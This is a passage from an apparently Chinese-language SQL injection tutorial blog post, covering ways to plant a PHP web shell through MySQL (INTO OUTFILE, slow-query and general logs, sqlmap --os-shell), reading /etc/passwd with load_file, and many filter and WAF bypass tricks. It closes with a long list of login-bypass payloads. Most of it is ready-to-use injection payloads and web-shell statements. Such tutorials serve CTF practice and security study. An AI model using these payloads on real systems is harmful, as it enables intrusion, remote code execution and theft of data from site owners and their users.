<h2 id="mysql-getshell"><a href="#mysql-getshell" class="headerlink" title="mysql getshell"></a>mysql getshell</h2><h3 id="获取网站根目录"><a href="#获取网站根目录" class="headerlink" title="获取网站根目录"></a>获取网站根目录</h3><ul>
<li>phpinfo()：直接显示web路径</li>
<li>web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径（单引号、参数报错）</li>
<li>一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以猜测默认路径或者通过查看数据库保存的路径、配置文件等</li>
<li>搜索引擎、利用其他漏洞、中间件错误解析等</li>
</ul>
<h3 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h3><p>利用条件：</p>
<ul>
<li><p><strong>secure_file_priv为空</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>secure_file_priv &#x3D; 任意路径读写</strong><br><strong>secure_file_priv &#x3D; path 只能在该指定路径下读写</strong><br><strong>secure_file_priv &#x3D; null 不能读写</strong></p>
</blockquote>
</li>
<li><p><strong>具有写入文件权限</strong></p>
</li>
<li><p><strong>知道网站绝对路径</strong></p>
</li>
</ul>
<p><code>into outfile</code>与<code>into dumpfile</code>用法一样，都能够写文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[CMD]); ?&gt;&#x27; into outfile &#x27;\/var\/www\/html\/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>load_file()函数读取文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union select 1, 2, 3, load_file(&#x27;//etc//passwd&#x27;), 5</span><br></pre></td></tr></table></figure>

<h3 id="慢日志写shell"><a href="#慢日志写shell" class="headerlink" title="慢日志写shell"></a>慢日志写shell</h3><p>慢日志：一般都是通过long_query_time选项来设置时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。</p>
<p>前提：</p>
<ul>
<li><strong>root权限</strong></li>
<li><strong>网站的绝对路径且具有写入权限</strong></li>
</ul>
<p>查看服务器默认时间值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;</span><br><span class="line">show global variables like &#x27;%long%&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-164739.png"></p>
<p>查看慢日志参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%slow%&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-165029.png"></p>
<p>慢日志参数修改getshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1  #打开慢日志</span><br><span class="line">set global slow_query_log_file=&#x27;D:\\phpStudy\\WWW\\shell.php&#x27;  #设置慢日志路径，注意：一定要用双反斜杠</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; or sleep(11)  #这儿11是超过慢日志的10秒时间</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ20250419-165553.png"></p>
<h3 id="general-log全局日志写shell"><a href="#general-log全局日志写shell" class="headerlink" title="general_log全局日志写shell"></a>general_log全局日志写shell</h3><p><strong>利用前提</strong>：</p>
<ul>
<li><p><strong>root权限</strong></p>
</li>
<li><p><strong>网站的绝对路径且具有写入权限</strong></p>
</li>
</ul>
<p><strong>相关参数</strong>：</p>
<ul>
<li><p><code>general_log</code>：控制是否启用通用查询日志（记录所有客户端执行的SQL语句）。</p>
</li>
<li><p><code>log_output</code>：指定通用查询日志的输出方式，支持两种模式</p>
<ul>
<li><code>FILE</code>：日志写入文件（默认值）。</li>
<li><code>TABLE</code>：日志存入<code>mysql.general_log</code>系统表。</li>
<li><code>FILE,TABLE</code>：同时输出到文件和数据表。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL log_output = &#x27;FILE&#x27;;   -- 仅文件</span><br><span class="line">SET GLOBAL log_output = &#x27;TABLE&#x27;;  -- 仅表</span><br><span class="line">SET GLOBAL log_output = &#x27;FILE,TABLE&#x27;; -- 同时输出</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>general_log_file</code>：定义通用查询日志文件的存储路径（仅当<code>log_output</code>包含<code>FILE</code>时生效）。</p>
</li>
</ul>
<p><strong>原理</strong>：开启<strong>general_log</strong>后，系统将mysql执行的每一条查询语句写入我们<strong>指定位置的文件</strong>里。而文件的位置则由<strong>general_log_file</strong>确定。我们可以开启这个选项后，执行<code>SELECT &#39;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code>，这个指令就把木马插入到我们指定的php文件中去了。</p>
<p><strong>利用</strong>：</p>
<p>开启日志功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;   # 查看日志是否开启</span><br><span class="line">set global general_log=on;   # 开启日志功能</span><br></pre></td></tr></table></figure>

<p>设置日志输出类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;log_output&#x27;;</span><br><span class="line">set global log_output=&#x27;file&#x27;;</span><br></pre></td></tr></table></figure>

<p>设置日志保存位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log_file&#x27;;</span><br><span class="line">set global general_log_file=&#x27;D:/phpStudy/WWW/shell.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>写shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-–os-shell写shell"><a href="#sqlmap-–os-shell写shell" class="headerlink" title="sqlmap –os-shell写shell"></a>sqlmap –os-shell写shell</h3><p>原理就是利用sqlmap通过into outfile向服务器写入两个文件，一个可以直接执行命令，一个进行文件上传。</p>
<p>条件：</p>
<ul>
<li><strong>要求为数据库DBA，使用<code>--is-dba</code>查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</strong></li>
<li><strong>secure_file_priv没有具体值</strong></li>
<li><strong>知道网站的绝对路径</strong></li>
</ul>
<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="information-schema过滤绕过"><a href="#information-schema过滤绕过" class="headerlink" title="information_schema过滤绕过"></a>information_schema过滤绕过</h3><p>在注入时，infromation_schema库的作用是获取<code>table_schema、table_name、column_name</code>这些数据库内的信息。</p>
<p>而一些题会将<strong>or过滤</strong>使我们查表时无法使用<code>information_schema</code>，而往往这种题型都需要将<code>information_schema</code>替换并配合无列名注入来得到flag</p>
<h4 id="InnoDB-引擎表"><a href="#InnoDB-引擎表" class="headerlink" title="InnoDB 引擎表"></a>InnoDB 引擎表</h4><ul>
<li><p><strong>mysql.innodb_table_stats: 存储 InnoDB 表的统计信息。</strong></p>
</li>
<li><p><strong>mysql.innodb_index_stats: 存储 InnoDB 索引的统计信息。</strong><br><strong>这两个表会记录表和索引的信息，日志会定期更新。</strong></p>
</li>
<li><p><strong>MySQL 5.6 及以上版本</strong></p>
<p>可以使用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>这两张表来替换information_schema.tables实现注入，但是<strong>缺点是没有列名</strong>，所以常配合无列名注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h4><p>在<strong>MySQL 5.7中，新增了sys系统数据库</strong>，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p>
<p>sys库下有两种表：</p>
<ul>
<li><strong>字母开头： 适合人阅读，显示是格式化的数；</strong></li>
<li><strong><code>x$</code>开头 ： 适合工具采集数据，原始类数据；</strong></li>
</ul>
<p>下面是sys库中可以代替<code>infromation_schema</code>注入作用的视图：</p>
<ul>
<li><p><strong><code>sys.schema_auto_increment_columns</code></strong> 对表自增ID的监控，用于保存那些有自增字段的表的数据库相关信息。缺点是依然无法查询指定数据库某表的列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code></strong></p>
<p>前面的<code>schema_auto_increment_columns</code>对应的是存在自增列的表，但是针对不存在自增列的表的话可以通过这两个视图来实现查询。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="比较符号-、过滤绕过"><a href="#比较符号-、过滤绕过" class="headerlink" title="比较符号=、&lt;、&gt;过滤绕过"></a>比较符号<code>=</code>、<code>&lt;</code>、<code>&gt;</code>过滤绕过</h3><h4 id="in"><a href="#in" class="headerlink" title="in()"></a>in()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) in(115);</span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure>

<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p>可利用like模糊查询代替<code>=</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) like &#x27;s%&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database() regexp &#x27;^s&#x27;; </span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure>

<h4 id="greatest-least"><a href="#greatest-least" class="headerlink" title="greatest()&#x2F;least()"></a>greatest()&#x2F;least()</h4><p><strong>greatest (n1, n2, n3…)</strong>: 返回 n 中的最大值</p>
<p><strong>least (n1,n2,n3…)</strong>: 返回 n 中的最小值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</span><br><span class="line">#这里的 greatest(查询，1）是用与比较取出其中最大的值用于爆破</span><br><span class="line">#如果任何给定值为NULL，则返回NULL。否则，它将返回最大值。</span><br></pre></td></tr></table></figure>

<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>**strcmp(str1,str2)**：比较两个字符串，如果这两个字符串相等返回0，如果第一个参数是根据当前的排序小于第二个参数顺序返回-1，否则返回1。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from users where id=1 and strcmp(asci(substr(username,1,1)),117)</span><br></pre></td></tr></table></figure>

<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)都能代替空格</p>
<h4 id="注释符代替"><a href="#注释符代替" class="headerlink" title="注释符代替"></a>注释符代替</h4><p>注释替换空格：<code>/**/</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/**/and/**/1=1</span><br></pre></td></tr></table></figure>

<h4 id="括号嵌套"><a href="#括号嵌套" class="headerlink" title="括号嵌套"></a>括号嵌套</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(table_name))from(information_schema.tables)where(tabel_schema=database());</span><br></pre></td></tr></table></figure>

<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>适用于对于大小写不敏感：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And</span><br></pre></td></tr></table></figure>

<h3 id="Or-and-xor-not绕过"><a href="#Or-and-xor-not绕过" class="headerlink" title="Or and xor not绕过"></a>Or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">And == &amp;&amp;</span><br><span class="line">Or == ||</span><br><span class="line">Xor = |</span><br><span class="line">Not = !</span><br></pre></td></tr></table></figure>

<p>也可采用异或注入进行盲注：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</span><br></pre></td></tr></table></figure>

<p>or被过滤可采用无列名注入</p>
<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>mysql中的注释符：</p>
<ul>
<li>单行注释：<code>--+</code>、<code>-- </code>、<code>#</code></li>
<li>多行注释：<code>/*多行注释内容*/</code></li>
</ul>
<p>注释符常起到闭合单引号、多单引号、双引号等功能</p>
<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><ul>
<li><p><strong>if（）&#x3D;&gt; case…when..then…else…end</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line">=</span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>hex()、bin()&#x3D;&#x3D;&gt;ascii()</strong></p>
</li>
<li><p><strong>sleep()等价</strong>：</p>
<p><strong>benchmark():</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)  //5秒</span><br><span class="line">benchmark(10000000,sha(1))  //2.79秒</span><br></pre></td></tr></table></figure>

<p><strong>笛卡尔积</strong>：</p>
<p>笛卡尔积是指两个集合中所有可能的行组合，通过利用笛卡尔积计算大量数据从而导致时间延迟的效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1, (SELECT COUNT(*) FROM tableA, tableB, tableC), 0) --</span><br></pre></td></tr></table></figure>

<p><strong>GET_LOCK:</strong></p>
<p><code>GET_LOCK(str, timeout)</code>是MySQL的锁管理函数,通过竞争锁机制间接实现时间差判断</p>
<p>其中：</p>
<p><strong>str</strong>：锁名称（字符串，唯一标识）。</p>
<p><strong>timeout</strong>：尝试获取锁的最大等待时间（秒）。</p>
<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))=65, GET_LOCK(&#x27;injection_lock&#x27;,5), 0) --</span><br></pre></td></tr></table></figure>

<blockquote>
<p>攻击者首次注入时，尝试获取锁<code>injection_lock</code>，设置超时时间为5秒。</p>
</blockquote>
<p>当条件为真时当前会话会尝试获取锁，若锁已被占用则会阻塞5秒。</p>
<p>所以要达到延迟的效果我们需要一开始获取锁，使其被占用从而延迟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and get_lock(&#x27;injection_lock&#x27;,1)--</span><br></pre></td></tr></table></figure>

<p><strong>RLIKE:</strong></p>
<p>**RPAD(str, len, padstr)**：用于将字符串填充到指定长度。</p>
<p><strong>repeat</strong>：重复一个字符串指定次数。</p>
<p><strong>RLIKE</strong>：用于正则表达式匹配</p>
<p>原理就是<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>.*</code>贪婪匹配，会尽可能匹配更多字符。</p>
</blockquote>
<p><code>repeat(&#39;(a.\*)+&#39;, 30)</code>生成正则表达式片段 <code>(a.\*)+</code>重复30次后再追加字符b，形成完整正则表达式，当匹配时会尝试匹配所有字符找b从而达到时间延迟</p>
</li>
<li><p><strong>concat_ws()&#x3D;&#x3D;&gt;group_concat()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(database());</span><br><span class="line">=</span><br><span class="line">select concat_ws(1,database());</span><br></pre></td></tr></table></figure>
</li>
<li><p>mid()、substr()&#x3D;&#x3D;&gt;substring() </p>
</li>
<li><p>@@user&#x3D;&#x3D;&gt;user() </p>
</li>
<li><p>@@datadir&#x3D;&#x3D;&gt;datadir()</p>
<p>@表示用户变量，@@表示系统变量</p>
</li>
</ul>
<h3 id="引号过滤绕过"><a href="#引号过滤绕过" class="headerlink" title="引号过滤绕过"></a>引号过滤绕过</h3><p>适用<strong>十六进制绕过</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">=</span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

<h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p><strong>一般逗号在盲注中比较常见</strong></p>
<p><strong>使用from关键字绕过</strong>：对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from for</code>的方式来解决：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>

<p><strong>使用join绕过：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>

<p><strong>使用offset绕过：对于limit可以使用offset来绕过：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行</p>
</blockquote>
<p><strong>使用like绕过：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="过滤了union，select，where"><a href="#过滤了union，select，where" class="headerlink" title="过滤了union，select，where"></a>过滤了union，select，where</h3><p>注释符绕过：**<code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code>**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION /**/ SE/**/LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>

<p>大小写绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>

<p>内联注释绕过：<strong>把一些特有的仅在MySQL上的语句放在&#x2F;!…&#x2F;中</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>

<h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h3><p>原理：</p>
<p>原验证登陆语句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure>

<p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>优先级关系：or&lt;and&lt;not</p>
<p><strong><code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>为假，而<code>Username=&#39;1&#39; OR 1=1</code>肯定为真，所以整体为真</strong></p>
</blockquote>
<p><strong>万能密码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="MySQL黑魔法绕过"><a href="#MySQL黑魔法绕过" class="headerlink" title="MySQL黑魔法绕过"></a>MySQL黑魔法绕过</h3><p>原理就是利用MySQL<strong>解析特性绕过过滤规则</strong>的技巧：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and&#123;a 1=1&#125; and&#123;a 1=2&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>&#123;&#125;</code>：MySQL中通常用于标识变量或存储过程代码块，但在普通查询中可能被部分解析器忽略。</p>
